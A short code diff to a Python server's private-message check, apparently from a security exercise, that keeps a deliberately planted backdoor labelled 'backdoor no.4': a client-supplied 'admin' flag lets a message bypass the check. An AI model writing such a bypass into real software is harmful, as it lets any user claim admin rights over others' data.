@@ -204,9 +204,9 @@ class Server:
 
     def check_private_message(self, websocket, message):
         # backdoor no.4
-        parsed_message = json.loads(message["data"])
-        message_content = parsed_message.get("content", "")
-        is_admin = message_content.get("admin", False)
+        parsed_message = message["data"] if isinstance(message["data"], dict) else json.loads(message["data"])
+        
+        is_admin = parsed_message.get("admin", False)
         if is_admin:
             # bypass check for admin
             logging.info(f"adminnnnnnn!!")
